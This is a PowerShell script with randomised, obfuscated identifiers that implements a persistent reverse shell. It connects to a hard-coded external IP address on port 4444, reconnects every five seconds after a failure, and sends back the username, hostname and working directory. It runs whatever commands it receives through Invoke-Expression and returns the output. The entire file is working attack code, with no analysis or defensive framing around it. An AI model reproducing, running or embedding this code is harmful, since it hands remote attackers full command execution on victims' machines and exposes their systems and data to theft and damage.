class zJWhcYApxNaiTLnysrPy {
    
    [string]$sYILM = "93.93.112.55"
    [int]$UoVmpDFnstthPnmuFsLtqAn = 4444

    $fkZGVyplCcdhN
    $qOhfARmQotuHmzlkpZKov
    $DvOcCBwSMzGMoRFoRnru
    $wYWxijxfqYXRIYSXhvrmFfM
    $mhdysWCRebygcHjR
    $dPtXGiGbZMXMUG
    [int]$DiANYCBExWmiQMDNkwgbAfT = 50*1024

    slqeEociUKgkZCiRiKnfBSBl() {
        $this.qOhfARmQotuHmzlkpZKov = $false
        while ($true) {
            try {
                $this.qOhfARmQotuHmzlkpZKov = New-Object Net.Sockets.TcpClient($this.sYILM, $this.UoVmpDFnstthPnmuFsLtqAn)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.EOkHhIkfPERYyUGczPYR()
    }

    EOkHhIkfPERYyUGczPYR() {
        $this.fkZGVyplCcdhN = $this.qOhfARmQotuHmzlkpZKov.GetStream()
        $this.wYWxijxfqYXRIYSXhvrmFfM = New-Object Byte[] $this.DiANYCBExWmiQMDNkwgbAfT
        $this.dPtXGiGbZMXMUG = New-Object Text.UTF8Encoding
        $this.DvOcCBwSMzGMoRFoRnru = New-Object IO.StreamWriter($this.fkZGVyplCcdhN, [Text.Encoding]::UTF8, $this.DiANYCBExWmiQMDNkwgbAfT)
        $this.mhdysWCRebygcHjR = New-Object System.IO.StreamReader($this.fkZGVyplCcdhN)
        $this.DvOcCBwSMzGMoRFoRnru.AutoFlush = $true
    }

    BnUQJlIlFjKVagRvknQi() {
        $this.slqeEociUKgkZCiRiKnfBSBl()
        $this.oobXNdOVGYOrkKuQchZrwhj()
    }

    qysnDb($dJPWTSh) {
        try {
            [byte[]]$bfOUKUmpxwDroNklu = [text.Encoding]::Ascii.GetBytes($dJPWTSh)
            $this.DvOcCBwSMzGMoRFoRnru.Write($bfOUKUmpxwDroNklu, 0, $bfOUKUmpxwDroNklu.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.BnUQJlIlFjKVagRvknQi()
        }
    }

    [string] eOoTrWOJfhmjg() {
        try {
            $vgShk = $this.fkZGVyplCcdhN.Read($this.wYWxijxfqYXRIYSXhvrmFfM, 0, $this.DiANYCBExWmiQMDNkwgbAfT)    
            $LFMmEwMDMwcHKLjlzI = ($this.dPtXGiGbZMXMUG.GetString($this.wYWxijxfqYXRIYSXhvrmFfM, 0, $vgShk))
            return $LFMmEwMDMwcHKLjlzI
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.BnUQJlIlFjKVagRvknQi()
            return ""
        }
    }

    [string] ZXuzyKWuBnjYShgSulgqe($sSBhOo) {
        Write-Host $sSBhOo
        try { 
            $qhvkxOl = Invoke-Expression $sSBhOo | Out-String
        }
        catch {
            $RCGaRSZNmFiHYJlLIfXYe = $_.Exception
            $DhLFCozseRmsZwWbxFyvI = $_.Message
            $qhvkxOl = "`n$_`n"
        }
        return $qhvkxOl
    }

    [string] ATepLUnNzpymhTB() {
        $veBzBdywnLYUJN = [Environment]::UserName
        $bAAjzLbLB = [System.Net.Dns]::GetHostName()
        $DLtNbiWOLzaTKynwF = Get-Location
        return "$veBzBdywnLYUJN@$bAAjzLbLB [$DLtNbiWOLzaTKynwF]~$ "
    }

    oobXNdOVGYOrkKuQchZrwhj() {
        while ($this.qOhfARmQotuHmzlkpZKov.Connected) {
            $this.qysnDb($this.ATepLUnNzpymhTB())         
            $LFMmEwMDMwcHKLjlzI = $this.eOoTrWOJfhmjg()
            $qhvkxOl = "`n"
            if ([string]::IsNullOrEmpty($LFMmEwMDMwcHKLjlzI)) {
                continue
            }
            $qhvkxOl = $this.ZXuzyKWuBnjYShgSulgqe($LFMmEwMDMwcHKLjlzI)
            $this.qysnDb($qhvkxOl + "`n")
            $this.fkZGVyplCcdhN.Flush()
        }
        $this.qOhfARmQotuHmzlkpZKov.Close()
        $this.BnUQJlIlFjKVagRvknQi()
    } 
}

$jSEwPzBYrTTy = [zJWhcYApxNaiTLnysrPy]::new()
$jSEwPzBYrTTy.BnUQJlIlFjKVagRvknQi()
